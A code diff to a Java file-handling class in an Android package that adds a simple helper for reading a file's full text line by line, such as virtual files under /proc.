@@ -11,13 +11,16 @@ package com.android.dvci.file;
 
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FileReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.Date;
+import java.util.logging.Logger;
 
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -68,7 +71,48 @@ public final class AutoFile {
 	public byte[] read() {
 		return read(0);
 	}
+	/**
+	 * Reads the content of the file, without checking the file size
+	 * this is useful for virtual files like those in /proc/
+	 *
+	 * @return the String
+	 */
 
+	static public String getFileContents(String path) {
+		//...checks on aFile are elided
+		StringBuilder contents = new StringBuilder();
+
+		try {
+			//use buffering, reading one line at a time
+			//FileReader always assumes default encoding is OK!
+			BufferedReader input = new BufferedReader(new FileReader(new File(path)));
+			try {
+				String line = null; //not declared within while loop
+        /*
+                 * readLine is a bit quirky : it returns the content of a line
+                 * MINUS the newline. it returns null only for the END of the
+                 * stream. it returns an empty String if two newlines appear in
+                 * a row.
+                 */
+				while ((line = input.readLine()) != null) {
+					contents.append(line);
+					contents.append("\n");
+				}
+			} finally {
+				input.close();
+			}
+		} catch (IOException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(ex);//$NON-NLS-1$
+			}
+		}
+
+		return contents.toString();
+	}
 	/**
 	 * Read the file starting from the offset specified.
 	 * 
